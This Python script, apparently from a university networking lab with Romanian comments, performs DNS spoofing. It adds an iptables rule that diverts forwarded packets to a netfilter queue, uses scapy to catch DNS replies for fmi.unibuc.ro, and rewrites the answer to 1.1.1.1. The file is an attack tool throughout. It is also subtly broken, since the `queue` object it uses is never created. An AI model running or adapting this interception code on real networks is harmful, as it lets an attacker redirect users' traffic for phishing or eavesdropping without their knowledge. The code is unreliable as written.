#!/usr/bin/env python3

from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ
import os

def detect_and_alter_packet(packet):
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """
    octets = packet.get_payload()
    scapy_packet = IP(octets)
    # if the packet is a DNS Resource Record (DNS reply)
    # modify the packet
    if scapy_packet.haslayer(IP) and scapy_packet.haslayer(UDP) and scapy_packet.haslayer(DNSRR):
        print("[Before]:", scapy_packet.summary())
        scapy_packet = alter_packet(scapy_packet)
        print("[After ]:", scapy_packet.summary())
        # put it back in the queue in the form of octets
        packet.set_payload(bytes(scapy_packet))
    # accept the packet in the queue
    packet.accept()


def alter_packet(packet):
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    # daca nu e site-ul fmi, returnam fara modificari
    if qname != b'fmi.unibuc.ro.':
        return packet
    # construim un nou raspuns cu rdata
    packet[DNS].an = DNSRR(rrname=qname, rdata='1.1.1.1')
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet


try:
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
    # bind trebuie să folosească aceiași coadă ca cea definită în iptables
    queue.bind(10, detect_and_alter_packet)
    queue.run()
except KeyboardInterrupt:
    queue.unbind()
